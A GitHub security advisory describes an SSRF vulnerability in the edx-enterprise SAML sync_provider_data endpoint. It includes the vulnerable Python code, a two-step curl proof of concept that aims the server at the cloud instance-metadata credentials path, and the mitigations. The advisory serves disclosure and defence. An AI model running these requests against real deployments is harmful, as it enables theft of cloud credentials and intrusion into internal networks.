# [H] edx-enterprise has SSRF via SAML metadata URL in sync_provider_data endpoint

## Summary
Severity: High
Advisory: GHSA-64cv-vxpr-j6vc
CVE: CVE-2026-42860
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-64cv-vxpr-j6vc
Type: github-advisory

## Affected
- PyPI: `edx-enterprise` — affected >=7.0.2 <7.0.5

## Details
## Summary

The `sync_provider_data` endpoint in `SAMLProviderDataViewSet` fetches SAML metadata from a URL stored in `SAMLProviderConfig.metadata_source`. An authenticated user with the Enterprise Admin role can set this field to an arbitrary URL via the `SAMLProviderConfigViewSet` PATCH endpoint, then trigger a server-side HTTP request by calling `sync_provider_data`. The fetch in `fetch_metadata_xml()` passes the URL directly to `requests.get()` with no scheme enforcement, IP filtering, or timeout.

This vulnerability was introduced when the SAML admin viewsets were migrated from `openedx-platform` into `edx-enterprise`. A related fix for the equivalent fetch path in `openedx-platform` (the `fetch_saml_metadata` Celery task) was applied in [GHSA-328g-7h4g-r2m9](https://github.com/openedx/openedx-platform/security/advisories/GHSA-328g-7h4g-r2m9).

## Details

**Vulnerable code path:**

`enterprise/api/v1/views/saml_utils.py`:
```python
def fetch_metadata_xml(url):
    log.info("Fetching %s", url)
    if not url.lower().startswith('https'):
        log.warning("This SAML metadata URL is not secure! (%s)", url)
    response = requests.get(url, verify=True)  # No IP/scheme validation
    response.raise_for_status()
```

`enterprise/api/v1/views/saml_provider_data.py`:
```python
@action(detail=False, methods=['post'], url_path='sync_provider_data')
def sync_provider_data(self, request):
    ...
    metadata_url = saml_provider.metadata_source  # set via SAMLProviderConfig PATCH
    xml = fetch_metadata_xml(metadata_url)        # triggers the fetch
```

**Missing protections:**
- No HTTPS enforcement (HTTP is allowed; the warning is not enforced)
- No blocking of loopback (`127.0.0.0/8`) or link-local (`169.254.0.0/16`) ranges
- No blocking of RFC 1918 private ranges
- No request timeout

## Proof of Concept

**Prerequisites:** Authenticated user with `Enterprise Admin` role for any enterprise customer with a configured SAML Identity Provider.

**Step 1:** Set a malicious metadata URL via the provider config endpoint:
```bash
curl -X PATCH 'https://<instance>/auth/saml/v0/provider_config/<pk>/' \
  -H 'Authorization: Bearer <JWT>' \
  -H 'Content-Type: application/json' \
  -d '{"metadata_source": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

**Step 2:** Trigger the server-side fetch:
```bash
curl -X POST 'https://<instance>/auth/saml/v0/provider_data/sync_provider_data' \
  -H 'Authorization: Bearer <JWT>' \
  -H 'Content-Type: application/json' \
  -d '{"enterprise_customer_uuid": "<uuid>"}'
```

The server fetches the AWS metadata endpoint. Even though XML parsing will fail, the HTTP request is made and timing/error differences confirm reachability of internal addresses.

## Impact

An Enterprise Admin can use this SSRF to:

- **Steal cloud credentials:** Access AWS/GCP/Azure instance metadata services to retrieve IAM temporary credentials, potentially enabling full cloud infrastructure compromise.
- **Scan internal networks:** Probe internal hosts, ports, and services behind the deployment's firewall.
- **Access internal APIs:** Reach databases, admin panels, or microservices not exposed to the internet.

Enterprise Admin is a delegated role typically granted to corporate training managers, not platform operators. It should not grant the ability to make the server issue arbitrary outbound HTTP requests.

## Patches / Mitigations

Call `validate_saml_metadata_url()` (importable from `common.djangoapps.third_party_auth.utils` as of the openedx-platform fix in [GHSA-328g-7h4g-r2m9](https://github.com/openedx/openedx-platform/security/advisories/GHSA-328g-7h4g-r2m9)) in `fetch_metadata_xml()` before calling `requests.get()`. A request timeout should also be added.

Operators should additionally enforce network-level egress filtering to block outbound connections from the Open edX server to `169.254.0.0/16` and RFC 1918 ranges as a complementary control, particularly to cover hostname-based URLs that cannot be validated at the application layer.

## References
- https://github.com/openedx/edx-enterprise/security/advisories/GHSA-64cv-vxpr-j6vc
- https://nvd.nist.gov/vuln/detail/CVE-2026-42860
- https://github.com/openedx/edx-enterprise
- https://github.com/pypa/advisory-database/tree/main/vulns/edx-enterprise/PYSEC-2026-58.yaml
